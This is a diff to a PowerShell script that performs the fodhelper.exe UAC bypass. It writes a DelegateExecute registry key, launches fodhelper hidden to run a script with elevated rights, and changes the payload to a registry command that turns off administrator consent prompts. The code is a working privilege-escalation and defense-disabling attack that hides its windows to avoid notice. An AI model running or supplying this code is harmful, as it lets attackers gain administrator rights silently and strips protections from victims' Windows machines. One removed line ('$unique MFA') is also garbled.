@@ -47,7 +47,7 @@ try {
 # Define the commands to execute with elevated privileges
 $CommandsToExecute = @"
 # Define your commands here
-C:\Windows\Script.vbs
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
 "@
 
 # Write the commands to a script file in the hidden folder
@@ -67,8 +67,8 @@ try {
     # Create the registry key and set required properties
     New-Item -Path $regKeyPath -Force | Out-Null
     New-ItemProperty -Path $regKeyPath -Name "DelegateExecute" -Value "" -Force | Out-Null
-    # Define the command to execute the script file with additional parameters to minimize visibility
-    $command = "$destinationPathPowershell -WindowStyle Hidden -NoLogo -NonInteractive -File `"$scriptPath`""
+    # Define the command to execute the script file with hidden window
+    $command = "$destinationPathPowershell -WindowStyle Hidden -File `"$scriptPath`""
     Set-ItemProperty -Path $regKeyPath -Name "(default)" -Value $command -Force
     Write-Host "Registry key created and command set to: $command"
 } catch {
@@ -80,7 +80,7 @@ try {
 try {
     $fodhelperPath = "C:\Windows\System32\fodhelper.exe"
     if (Test-Path $fodhelperPath) {
-        Start-Process -FilePath $fodhelperPath -WindowStyle Hidden -NoNewWindow
+        Start-Process -FilePath $fodhelperPath -WindowStyle Hidden
         Write-Host "Fodhelper.exe executed."
     } else {
         Write-Error "Fodhelper.exe not found. Exiting script."
@@ -96,7 +96,7 @@ try {
     $isPowershellRunning = $true
     Write-Host "Waiting for the PowerShell process to complete..."
     while ($isPowershellRunning) {
-        $process = Get-Process -Name $unique MFA -ErrorAction SilentlyContinue
+        $process = Get-Process -Name $uniqueExeNamePowershell -ErrorAction SilentlyContinue
         if ($process -eq $null) {
             $isPowershellRunning = $false
             Write-Host "PowerShell process completed."
